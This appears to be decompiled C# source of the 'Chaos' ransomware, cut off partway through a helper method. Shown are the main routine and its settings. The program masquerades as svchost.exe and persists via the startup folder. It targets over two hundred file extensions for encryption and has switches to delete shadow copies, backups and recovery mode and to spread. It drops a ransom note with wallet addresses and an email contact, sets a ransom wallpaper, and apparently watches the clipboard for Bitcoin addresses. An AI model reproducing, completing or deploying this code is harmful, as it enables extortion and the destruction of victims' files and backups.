using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = false;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[21]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $10,500. Payment can be made in Bitcoin only.", "You have 6 hours to make the payment or your data will be irrecoverable.", "", "Contact us via email:- cairo20@mail2tor.com", "",
		"Payment informationAmount: 0.3710 BTC", "", "BTC:   ", "16LYjmErwNek2gMQkNrkLm2i1QVhjmxSRo", "", "ETH:  ", "0xdF0f41d46Dd8Be583F9a69b4a85A600C8Af7f4Ad", "", "USDT TRC20:  ", "TW4fgiTRwTdFj47Z3pokKrmn7EBU5YBmsF",
		""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
